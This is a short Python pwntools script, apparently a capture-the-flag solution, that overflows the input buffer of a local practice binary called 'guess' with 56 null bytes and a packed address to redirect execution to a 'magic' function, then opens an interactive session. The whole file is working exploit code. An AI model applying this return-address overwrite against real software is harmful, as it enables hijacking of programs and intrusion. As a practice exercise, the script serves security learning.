from pwn import *

p = process("./guess")

magic = 0x0000000004006BE

payload = "\x00" * 56 + p64(magic)

p.recvuntil("number.")
p.sendline(payload)

p.interactive()

